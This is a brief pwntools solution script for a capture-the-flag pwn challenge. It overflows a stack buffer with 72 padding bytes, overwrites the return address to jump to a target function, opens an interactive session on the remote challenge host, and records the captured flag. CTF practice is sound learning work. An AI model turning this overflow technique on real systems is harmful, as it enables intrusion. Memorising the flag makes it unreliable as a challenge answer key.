from pwn import *
p=process('./chall')
p=remote('chall.v1t.site', 30210)
payload=b'a'*72+p64(0x40128c)
p.sendafter(b'coming!\n',payload)
p.interactive()
#v1t{w4ddl3r_3x1t5_4e4d6c332b6fe62a63afe56171fd3725}
